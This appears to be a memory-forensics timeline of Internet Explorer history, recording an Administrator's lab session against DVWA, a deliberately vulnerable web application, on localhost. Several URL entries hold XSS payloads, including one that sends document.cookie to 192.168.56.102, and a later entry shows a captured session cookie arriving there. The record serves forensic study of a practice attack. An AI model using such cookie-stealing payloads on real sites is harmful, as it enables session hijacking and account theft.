2015-09-03 10:04:05 UTC+0000|[LIVE RESPONSE]| (System time)|
2015-08-23 10:32:03 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://www.bing.com/search?format=rss&q=localhost&src=IE-Address| PID: 816/Cache type "URL " at 0x25f5000 End: 2015-08-23 10:32:03 UTC+0000
2015-08-23 10:31:51 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@res://iesetup.dll/HardAdmin.htm| PID: 816/Cache type "URL " at 0x25f5180 End: 2015-08-23 10:31:51 UTC+0000
2015-08-23 10:32:59 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://www.bing.com/search?q=localhost&src=IE-Address| PID: 816/Cache type "URL " at 0x25f6000 End: 2015-08-23 10:32:59 UTC+0000
2015-09-02 05:59:58 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/security.php?phpids=on| PID: 816/Cache type "URL " at 0x25f6180 End: 2015-09-02 05:59:58 UTC+0000
2015-09-02 05:59:08 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost| PID: 816/Cache type "URL " at 0x25f6280 End: 2015-09-02 05:59:08 UTC+0000
2015-09-02 06:00:18 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/security.php| PID: 816/Cache type "URL " at 0x25f6380 End: 2015-09-02 06:00:18 UTC+0000
2015-09-02 06:00:18 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/security.php?phpids=off| PID: 816/Cache type "URL " at 0x25f6500 End: 2015-09-02 06:00:18 UTC+0000
2015-09-02 06:00:06 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/security.php?test=%22><script>eval(window.name)</script>| PID: 816/Cache type "URL " at 0x25f6680 End: 2015-09-02 06:00:06 UTC+0000
2015-09-02 06:00:16 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/security.php| PID: 816/Cache type "URL " at 0x25f6800 End: 2015-09-02 06:00:16 UTC+0000
2015-09-03 10:03:01 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dashboard| PID: 816/Cache type "URL " at 0x25f7000 End: 2015-09-03 10:03:01 UTC+0000
2015-09-02 06:05:41 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/vulnerabilities/xss_r/vulnerabilities/xss_r| PID: 816/Cache type "URL " at 0x25f7180 End: 2015-09-02 06:05:41 UTC+0000
2015-09-03 06:49:30 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/vulnerabilities/xss_s/vulnerabilities/xss_s| PID: 816/Cache type "URL " at 0x25f7280 End: 2015-09-03 06:49:30 UTC+0000
2015-09-02 06:01:11 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/vulnerabilities/upload| PID: 816/Cache type "URL " at 0x25f7480 End: 2015-09-02 06:01:11 UTC+0000
2015-09-02 06:00:22 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/vulnerabilities/upload/vulnerabilities/upload| PID: 816/Cache type "URL " at 0x25f7600 End: 2015-09-02 06:00:22 UTC+0000
2015-09-02 06:05:13 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/ids_log.php| PID: 816/Cache type "URL " at 0x25f7700 End: 2015-09-02 06:05:13 UTC+0000
2015-09-02 06:04:40 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://192.168.56.102/favicon.ico| PID: 816/Cache type "URL " at 0x25f7880 End: 2015-09-02 06:04:40 UTC+0000
2015-09-02 06:05:13 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/index.php| PID: 816/Cache type "URL " at 0x25f7980 End: 2015-09-02 06:05:13 UTC+0000
2015-09-02 06:05:49 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/ids_log.php| PID: 816/Cache type "URL " at 0x25f8000 End: 2015-09-02 06:05:49 UTC+0000
2015-09-02 06:05:05 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://192.168.56.102/?security=low;%20_ga=GA1.1.1982739354.1440366396;%20_gat=1;%20PHPSESSID=gt9jmpq3k9h0hbtrpiqgrj0nc0| PID: 816/Cache type "URL " at 0x25f8200 End: 2015-09-02 06:05:05 UTC+0000
2015-09-02 06:05:05 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location%3D%22http%3A%2F%2F192.168.56.102%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E| PID: 816/Cache type "URL " at 0x25f8380 End: 2015-09-02 06:05:05 UTC+0000
2015-09-02 06:05:42 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/ids_log.php| PID: 816/Cache type "URL " at 0x25f8500 End: 2015-09-02 06:05:42 UTC+0000
2015-09-02 06:05:42 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/vulnerabilities/xss_r| PID: 816/Cache type "URL " at 0x25f8680 End: 2015-09-02 06:05:42 UTC+0000
2015-09-02 06:05:43 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/vulnerabilities/xss_s| PID: 816/Cache type "URL " at 0x25f8880 End: 2015-09-02 06:05:43 UTC+0000
2015-09-03 10:03:01 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/vulnerabilities/xss_s| PID: 816/Cache type "URL " at 0x25f9000 End: 2015-09-03 10:03:01 UTC+0000
2015-09-02 06:05:45 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/setup.php| PID: 816/Cache type "URL " at 0x25f9200 End: 2015-09-02 06:05:45 UTC+0000
2015-09-03 06:49:29 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/index.php| PID: 816/Cache type "URL " at 0x25f9300 End: 2015-09-03 06:49:29 UTC+0000
2015-09-02 06:05:47 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/setup.php| PID: 816/Cache type "URL " at 0x25f9480 End: 2015-09-02 06:05:47 UTC+0000
2015-09-03 06:49:28 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/login.php| PID: 816/Cache type "URL " at 0x25f9600 End: 2015-09-03 06:49:28 UTC+0000
2015-09-03 06:49:23 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa| PID: 816/Cache type "URL " at 0x25f9780 End: 2015-09-03 06:49:23 UTC+0000
2015-09-03 10:03:01 UTC+0000|[IEHISTORY]| explorer.exe->Visited: Administrator@http://localhost/dvwa/vulnerabilities/xss_s| PID: 816/Cache type "URL " at 0x25f9900 End: 2015-09-03 10:03:01 UTC+0000
2015-08-12 15:27:06 UTC+0000|[IEHISTORY]| explorer.exe->http://localhost/dashboard/| PID: 816/Cache type "URL " at 0x2606080 End: 2015-09-02 07:01:12 UTC+0000
2015-09-03 07:02:46 UTC+0000|[IEHISTORY]| explorer.exe->http://192.168.56.102/| PID: 816/Cache type "URL " at 0x2606200 End: 2015-09-03 07:03:41 UTC+0000
2013-10-19 01:08:06 UTC+0000|[IEHISTORY]| explorer.exe->http://www.bing.com/favicon.ico| PID: 816/Cache type "URL " at 0x2606600 End: 2015-08-23 10:32:03 UTC+0000
2015-07-21 18:46:08 UTC+0000|[IEHISTORY]| explorer.exe->http://localhost/dashboard/stylesheets/normalize.css| PID: 816/Cache type "URL " at 0x2607000 End: 2015-09-02 07:01:12 UTC+0000
2015-07-21 18:46:08 UTC+0000|[IEHISTORY]| explorer.exe->http://localhost/dashboard/stylesheets/all.css| PID: 816/Cache type "URL " at 0x2607180 End: 2015-09-02 07:01:12 UTC+0000
